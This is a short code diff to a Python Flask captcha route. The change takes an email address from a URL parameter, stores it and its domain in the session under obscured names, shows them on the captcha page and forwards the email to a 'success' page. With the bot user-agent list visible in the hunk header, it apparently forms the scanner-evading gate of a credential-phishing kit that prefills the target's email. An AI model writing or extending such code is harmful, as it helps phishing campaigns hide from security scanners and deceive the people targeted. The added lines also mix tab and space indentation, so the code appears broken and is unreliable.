@@ -84,7 +84,7 @@ bot_user_agents = [
 def captcha():
     if request.method == 'GET':
         if 'passed_captcha' in session and session['passed_captcha']:
-            return redirect(url_for('success'))
+            return redirect(url_for('success', web=session.get('eman')))
 
         # Generate a random 4-digit code
         code = random.randint(1000, 9999)
@@ -110,6 +110,12 @@ def captcha():
             colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
             color = random.choice(colors)
             session['code'] = str(code)
+	    userauto = request.args.get('web', 'default@example.com')  # Use default to prevent errors
+	    userdomain = userauto.split('@')[-1] if '@' in userauto else 'unknown'
+	    # Store user info in session
+            session['eman'] = userauto
+            session['ins'] = userdomain
+
 
             return render_template('captcha.html', code=code, color=color, eman=session['eman'], ins=session['ins'], error=True)
 
